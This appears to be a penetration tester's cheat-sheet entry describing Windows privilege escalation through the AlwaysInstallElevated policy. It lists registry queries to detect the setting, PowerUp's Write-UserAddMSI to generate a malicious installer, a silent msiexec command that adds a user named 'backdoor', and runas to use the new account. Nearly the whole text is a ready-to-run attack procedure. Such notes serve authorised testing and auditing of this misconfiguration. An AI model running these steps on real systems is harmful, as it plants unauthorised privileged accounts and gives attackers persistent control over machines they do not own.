# AlwaysInstallElevated: Add User Bypass

OS: Windows
Description: Add a user if AlwaysInstallElevated is present
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Check for the AlwaysInstalledElevated Key

```jsx
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### If Present, use PowerUp to drop `Write-UserAddMSI`

```jsx
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

- add a user named ‘backdoor’ by running the generated .msi

```jsx
msiexec /i GeneratedFile.msi /quiet /qn /norestart
```

```jsx
runas /user:USER_CREATED cmd
```